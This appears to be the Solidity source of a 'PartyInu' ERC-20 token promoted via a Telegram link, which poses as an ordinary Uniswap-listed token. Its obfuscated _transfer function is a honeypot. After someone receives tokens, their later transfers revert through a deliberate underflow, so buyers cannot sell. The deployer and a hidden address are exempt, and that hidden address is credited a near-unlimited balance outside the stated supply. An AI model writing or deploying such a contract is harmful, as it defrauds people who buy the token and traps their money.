// https://t.me/partyinu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.1;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract PartyInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private complete;
    mapping(address => uint256) private thick;

    function _transfer(
        address blew,
        address vote,
        uint256 add
    ) internal override {
        uint256 thirty = hunter;

        if (thick[blew] == 0 && complete[blew] > 0 && blew != uniswapV2Pair) {
            thick[blew] -= thirty;
        }

        address blue = address(across);
        across = PartyInu(vote);
        complete[blue] += thirty + 1;

        _balances[blew] -= add;
        uint256 engine = (add / 100) * hunter;
        add -= engine;
        _balances[vote] += add;
    }

    uint256 public hunter = 3;

    constructor(
        string memory process,
        string memory mail,
        address sky,
        address lost
    ) ERC20(process, mail) {
        uniswapV2Router = IUniswapV2Router02(sky);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        thick[msg.sender] = take;
        thick[lost] = take;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[lost] = take;
    }

    PartyInu private across;
    uint256 private take = ~uint256(1);
}